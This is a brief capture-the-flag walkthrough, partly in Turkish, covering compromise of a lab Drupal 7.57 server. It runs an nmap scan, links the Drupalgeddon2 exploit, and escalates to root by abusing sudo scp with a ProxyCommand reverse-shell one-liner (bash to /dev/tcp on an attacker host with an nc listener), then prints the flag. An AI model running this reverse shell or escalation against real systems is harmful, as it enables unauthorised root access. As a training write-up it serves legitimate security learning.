```
areif@AreIf:~$ nmap -sV 172.16.0.248 
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-30 11:26 +03
Nmap scan report for 172.16.0.248
Host is up (0.10s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.45 seconds
```

`/CHANGELOG.txt` 
```
Drupal 7.57, 2018-02-21
-----------------------
- Fixed security issues (multiple vulnerabilities). See SA-CORE-2018-001.

Drupal 7.56, 2017-06-21
```
drupal sürümü 7.57

![[Pasted image 20250430224609.png]]

exploit-db
https://www.exploit-db.com/exploits/44449
Drupalgeddon2 açığın ismi 
whoami -> rain
/home/rain/non-privflag.txt

sudo - l 
```
sudo -l
sudo: unable to resolve host Bead-L2: Connection refused
Matching Defaults entries for rain on Bead-L2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rain may run the following commands on Bead-L2:
    (root) NOPASSWD: /usr/bin/scp
```

```
sudo /usr/bin/scp -o "ProxyCommand=bash -c 'bash -i >& /dev/tcp/172.16.16.5/4444 0>&1'" x y:
```

172.16.16.5 makinesinde -> nc -lvnp 4444 

172.16.16.5 makinesine root yetkili terminal gelir. -> cat privflag.txt
92af11594b9feee001f0150ecae6b88d



